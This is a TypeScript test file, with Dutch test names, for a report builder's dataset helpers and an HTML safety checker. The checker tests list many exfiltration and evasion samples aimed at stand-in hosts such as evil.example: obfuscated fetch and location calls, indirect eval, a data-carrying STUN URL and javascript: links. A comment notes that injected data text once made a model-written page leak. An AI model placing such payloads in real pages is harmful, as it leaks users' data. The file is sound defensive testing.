import { test } from 'node:test';
import assert from 'node:assert/strict';
import { capResults, compactForModel, datasetInput, isTruncated, normalizeDatasets, placeholderValue, resolvePlaceholders, type DatasetResult } from './reportDatasets.ts';
import { applyHtmlEdits, checkReportHtml, referencedDatasetKeys } from './reportHtml.ts';

const TODAY = '2026-11-09'; // een maandag

test('datum-tokens lopen mee met vandaag', () => {
  const v = (t: string) => placeholderValue(t, TODAY);
  assert.equal(v('vandaag'), '2026-11-09');
  assert.equal(v('gisteren'), '2026-11-08');
  assert.equal(v('begin_week'), '2026-11-09');
  assert.equal(v('eind_week'), '2026-11-15');
  assert.equal(v('begin_vorige_week'), '2026-11-02');
  assert.equal(v('eind_vorige_week'), '2026-11-08');
  assert.equal(v('begin_maand'), '2026-11-01');
  assert.equal(v('eind_maand'), '2026-11-30');
  assert.equal(v('begin_vorige_maand'), '2026-10-01');
  assert.equal(v('eind_vorige_maand'), '2026-10-31');
  assert.equal(v('begin_kwartaal'), '2026-10-01');
  assert.equal(v('eind_kwartaal'), '2026-12-31');
  assert.equal(v('begin_vorig_kwartaal'), '2026-07-01');
  assert.equal(v('eind_vorig_kwartaal'), '2026-09-30');
  assert.equal(v('begin_jaar'), '2026-01-01');
  assert.equal(v('eind_vorig_jaar'), '2025-12-31');
  assert.equal(v('zelfde_dag_vorig_jaar'), '2025-11-09');
  assert.equal(v('maanden_terug:11'), '2025-12-01');
  assert.equal(v('maanden_terug:0'), '2026-11-01');
  assert.equal(v('dagen_terug:30'), '2026-10-10');
  assert.equal(v('jaren_terug:2'), '2024-01-01');
  assert.equal(v('dit_jaar'), 2026);
  assert.equal(v('dit_kwartaal'), 4);
  assert.equal(v('bestaat_niet'), null);
  assert.equal(v('dagen_terug:abc'), null);
  // Rond de jaarwisseling en in een schrikkeljaar.
  assert.equal(placeholderValue('begin_vorig_kwartaal', '2026-02-10'), '2025-10-01');
  assert.equal(placeholderValue('eind_vorig_kwartaal', '2026-02-10'), '2025-12-31');
  assert.equal(placeholderValue('zelfde_dag_vorig_jaar', '2028-02-29'), '2027-02-28');
});

test('tokens in de hele invoer; een los getal-token wordt een getal; onbekend is een fout', () => {
  const input = { source: 'invoices', from: '{{begin_jaar}}', to: '{{ vandaag }}', year: '{{dit_jaar}}', note: 'sinds {{begin_maand}}', filters: [{ value: ['{{gisteren}}'] }] };
  assert.deepEqual(resolvePlaceholders(input, TODAY), {
    source: 'invoices', from: '2026-01-01', to: '2026-11-09', year: 2026, note: 'sinds 2026-11-01', filters: [{ value: ['2026-11-08'] }],
  });
  const bad = datasetInput({ key: 'x', label: 'x', tool: 'query_records', input: { from: '{{begin_eeuw}}' } }, TODAY);
  assert.equal(bad.ok, false);
  assert.match(bad.ok ? '' : bad.error, /begin_eeuw/);
});

test('datasets: vorm, unieke sleutels en een plafond', () => {
  assert.equal(normalizeDatasets([{ key: 'omzet', label: 'Omzet', tool: 'query_records', input: {} }]).ok, true);
  assert.equal(normalizeDatasets([{ key: 'Omzet', tool: 'x', input: {} }]).ok, false);
  assert.equal(normalizeDatasets([{ key: 'a', tool: 'x', input: {} }, { key: 'a', tool: 'y', input: {} }]).ok, false);
  assert.equal(normalizeDatasets([{ key: 'a', tool: '', input: {} }]).ok, false);
  assert.equal(normalizeDatasets([{ key: 'a', tool: 'x', input: [] }]).ok, false);
  assert.equal(normalizeDatasets(Array.from({ length: 13 }, (_, i) => ({ key: `d${i}`, tool: 'x', input: {} }))).ok, false);
  assert.deepEqual(normalizeDatasets(undefined), { ok: true, value: [] });
});

test('het model ziet de vorm, de pagina krijgt alles', () => {
  const data = { count: 40, invoices: Array.from({ length: 40 }, (_, i) => ({ number: `F${i}` })) };
  const text = compactForModel(data, 5);
  assert.match(text, /"invoices":\[\{"number":"F0"\}/);
  assert.match(text, /invoices: 5 van 40 regels/);
  assert.equal(data.invoices.length, 40, 'het origineel blijft heel');
  assert.equal(isTruncated({ invoices: new Array(1000).fill({}) }, 1000), true);
  assert.equal(isTruncated({ invoices: new Array(10).fill({}) }, 1000), false);
  assert.equal(isTruncated({ groups: [], truncated: true }, 1000), true);
});

test('te veel gegevens: de grootste lijst wordt ingekort en gemarkeerd', () => {
  const big: DatasetResult = { key: 'groot', label: '', tool: 't', ok: true, data: { rows: Array.from({ length: 1000 }, (_, i) => ({ i, tekst: 'x'.repeat(50) })) }, rows: 1000, truncated: false };
  const small: DatasetResult = { key: 'klein', label: '', tool: 't', ok: true, data: { rows: [{ a: 1 }] }, rows: 1, truncated: false };
  const [a, b] = capResults([big, small], 20_000);
  assert.equal(a.truncated, true);
  assert.ok((a.rows ?? 0) < 1000 && (a.rows ?? 0) > 0);
  assert.ok(JSON.stringify(a.data).length + JSON.stringify(b.data).length <= 20_000);
  assert.equal(b.truncated, false);
});

test('HTML-wijzigingen: precies één treffer per zoektekst', () => {
  const html = '<h1>Omzet</h1><div id="a"></div><div id="b"></div>';
  assert.deepEqual(applyHtmlEdits(html, [{ find: '<h1>Omzet</h1>', replace: '<h1>Omzet 2026</h1>' }]), { ok: true, value: '<h1>Omzet 2026</h1><div id="a"></div><div id="b"></div>' });
  assert.equal(applyHtmlEdits(html, [{ find: '<div', replace: '<section' }]).ok, false);
  assert.equal(applyHtmlEdits(html, [{ find: 'bestaat niet', replace: '' }]).ok, false);
  assert.equal(applyHtmlEdits(html, []).ok, false);
  // `$&` in de vervanging is gewoon tekst, geen verwijzing.
  assert.deepEqual(applyHtmlEdits('a', [{ find: 'a', replace: '$&$&' }]), { ok: true, value: '$&$&' });
});

test('HTML-controle: geen netwerk, geen externe bronnen, geen navigatie', () => {
  const ok = '<div class="rf-page"><div id="x"></div></div><style>.x{color:var(--ink)}</style><script>RF.bar("#x",{data:RF.rows("omzet")}); if (r.location === "Utrecht") {}</script>';
  assert.deepEqual(checkReportHtml(ok), []);
  const bad = [
    '<script src="https://cdn.example/x.js"></script>',
    '<img src="https://evil.example/p.png">',
    '<div style="background:url(https://evil.example/x)"></div>',
    '<script>fetch("/x")</script>',
    '<script>new Image().src = "//evil"</script>',
    '<script>navigator.sendBeacon("x")</script>',
    '<script>localStorage.getItem("x")</script>',
    '<script>window.location = "https://evil"</script>',
    '<script>location.href = "https://evil"</script>',
    '<html><body>x</body></html>',
    '<iframe></iframe>',
    '<style>@import url("x.css");</style>',
    '<script>eval("1")</script>',
  ];
  for (const html of bad) assert.ok(checkReportHtml(html).length > 0, `had afgekeurd moeten worden: ${html}`);
});

test('HTML-controle: ook verstopte en opgebouwde omwegen naar buiten', () => {
  // Elk van deze kwam door de letterlijke regels hierboven; een pagina die door
  // ingevoegde tekst in de gegevens zo was geschreven, lekte bij elke keer openen.
  const bad = [
    `<script>window['fe'+'tch']('/x')</script>`,
    `<script>globalThis['loc'+'ation'] = 'https://evil'</script>`,
    `<script>self["op"+"en"]('https://evil')</script>`,
    `<script>(0, eval)('1')</script>`,
    `<script>[].constructor.constructor('return 1')()</script>`,
    `<script>setTimeout("alert(1)", 1)</script>`,
    `<script>import('https://evil/x.js')</script>`,
    `<script>new RTCPeerConnection({ iceServers: [{ urls: 'stun:x.evil.test' }] })</script>`,
    `<script>const c = { iceServers: [] }</script>`,
    `<script>const u = 'stun:' + data + '.evil.test'</script>`,
    `<script>const a = document.createElement('a'); a.href = 'https:' + '//evil'; a.click()</script>`,
    `<script>el.setAttribute('src', x)</script>`,
    `<a href="https:\\\\evil.example">x</a>`,
    `<a href="javascript:alert(1)">x</a>`,
    `<script>document.createElement('ifr' + 'ame'); document.createElement("iframe")</script>`,
    `<script>document.write('<p>')</script>`,
    `<script>new DOMParser()</script>`,
    `<script>Reflect.get(window, 'x')</script>`,
    `<script>Object.getOwnPropertyNames(window)</script>`,
    `<script>for (const k in window) {}</script>`,
    `<script>(() => {}).constructor('return 1')()</script>`,
    `<div onclick="window['fe' + 'tch']('/x')">x</div>`,
  ];
  for (const html of bad) assert.ok(checkReportHtml(html).length > 0, `had afgekeurd moeten worden: ${html}`);
});

test('HTML-controle: gewone rapportagecode blijft toegestaan', () => {
  // De valkuilen van de strengere regels: RF.top in een variabele `top`, een
  // klasse met constructor, data-attributen, een anker binnen de pagina, en de
  // gewone insertAdjacentHTML (het kader zelf houdt frames tegen).
  const ok = [
    `<div id="x"></div><script>const top = RF.top(RF.rows('omzet'), 5, 'omzet'); document.getElementById('x').textContent = top[0] ? top[0].client_name : '';</script>`,
    `<script>class Teller { constructor(n) { this.n = n; } } const t = new Teller(3);</script>`,
    `<div data-tab="omzet"></div><a href="#omzet">Omzet</a><script>document.querySelector('[data-tab]').setAttribute('data-actief', '1')</script>`,
    `<div id="l"></div><script>document.getElementById('l').insertAdjacentHTML('beforeend', '<p>' + RF.esc('Jansen') + '</p>')</script>`,
    `<p>De evaluatie van dit kwartaal: de omzet steeg.</p>`,
    `<img src="data:image/png;base64,iVBORw0KGgo=" alt="">`,
    // Uit de review: tekst op de pagina is geen script, en mail- en bellinks mogen.
    `<p>Btw verlegd bij import (rubriek 4a)</p><p>Diensten import (buiten EU)</p>`,
    `<a href="mailto:jan@jansen.nl">Mail Jan</a> <a href="tel:+31201234567">Bel</a>`,
    `<script>const v = RF.data.x; if (v && v.constructor === Object) {} const stand = { turn: 1 };</script>`,
  ];
  for (const html of ok) assert.deepEqual(checkReportHtml(html), [], `had goedgekeurd moeten worden: ${html}`);
});

test('welke datasets de HTML gebruikt', () => {
  const html = `RF.rows('omzet'); RF.totals("kosten"); RF.data.uren.groups; RF.meta['tickets'].error; RF.rows(x)`;
  assert.deepEqual(referencedDatasetKeys(html).sort(), ['kosten', 'omzet', 'tickets', 'uren']);
});
